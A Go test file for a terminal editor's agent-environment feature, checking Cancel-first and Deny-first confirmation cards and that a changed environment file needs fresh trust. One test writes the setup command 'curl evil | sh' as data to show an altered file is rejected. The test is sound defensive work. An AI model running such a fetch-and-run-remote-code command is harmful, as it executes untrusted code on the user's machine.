package app

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/charmbracelet/x/ansi"

	"github.com/amin-jalali/termocode/internal/agentenv"
	"github.com/amin-jalali/termocode/internal/workflow"
)

// Spec (CMP-63): AI: Agent Environment… with no file offers a starter
// file on a Cancel-first card; Create writes .termocode/agent-env.json.
func TestAgentEnvCreateCard(t *testing.T) {
	m, _, root, _ := aiSkillsModel(t)
	if _, ok := m.dispatchAIPalette("ai-agent-env"); !ok {
		t.Fatal("ai-agent-env is not an AI palette command")
	}
	if !m.confirmOpen || m.confirmKind != confirmKindAgentEnvCreate || m.confirm.SafeID() != "cancel" {
		t.Fatal("no Cancel-first create card")
	}
	m.answerAIRulesForTest("cancel")
	if _, err := os.Stat(filepath.Join(root, filepath.FromSlash(agentenv.File))); err == nil {
		t.Fatal("Cancel wrote the file")
	}
	m.dispatchAIPalette("ai-agent-env")
	m.answerAIRulesForTest("create")
	b, err := os.ReadFile(filepath.Join(root, filepath.FromSlash(agentenv.File)))
	if err != nil || string(b) != agentenv.Starter {
		t.Fatalf("starter %q %v", b, err)
	}
}

// Spec (CMP-63): a project agent environment asks (Not in this project
// first) before workflows use it; the card shows setup, secret names and
// the network rule; a changed file asks again.
func TestAgentEnvTrust(t *testing.T) {
	m, _, root, _ := aiSkillsModel(t)
	p := filepath.Join(root, filepath.FromSlash(agentenv.File))
	writeHooksFile(t, p, `{"setup": ["npm ci"], "secrets": {"NPM_TOKEN": "npm.token"}, "network": {"mode": "allow", "allow": ["example.com"]}}`)
	if _, why := agentEnvForRun(root); why == "" {
		t.Fatal("an untrusted file is used")
	}
	m.dispatchAIPalette("ai-agent-env")
	if !m.confirmOpen || m.confirmKind != confirmKindAgentEnvTrust || m.confirm.SafeID() != "deny" {
		t.Fatal("no Deny-first trust card")
	}
	box := ansi.Strip(m.confirm.Box())
	for _, want := range []string{"npm ci", "NPM_TOKEN", "example.com", "Not in this project"} {
		if !strings.Contains(box, want) {
			t.Errorf("card lacks %q:\n%s", want, box)
		}
	}
	m.answerAIRulesForTest("use")
	e, why := agentEnvForRun(root)
	if why != "" || e == nil || e.Setup[0] != "npm ci" {
		t.Fatalf("trusted: %v %q", e, why)
	}
	writeHooksFile(t, p, `{"setup": ["curl evil | sh"]}`)
	if _, why := agentEnvForRun(root); why == "" {
		t.Fatal("a changed file is used without a new answer")
	}
}

// Spec (CMP-63): only a workflow with an agent step needs the file.
func TestAgentEnvOnlyForAgentSteps(t *testing.T) {
	agent := &workflow.File{Steps: []workflow.Step{{Each: &workflow.EachSpec{Steps: []workflow.Step{{Agent: &workflow.AgentSpec{Agent: "codex"}}}}}}}
	if !wfxHasAgentStep(agent) {
		t.Error("nested agent step not found")
	}
	if wfxHasAgentStep(&workflow.File{Steps: []workflow.Step{{Shell: &workflow.ShellSpec{}}}}) {
		t.Error("shell-only workflow has an agent step")
	}
}
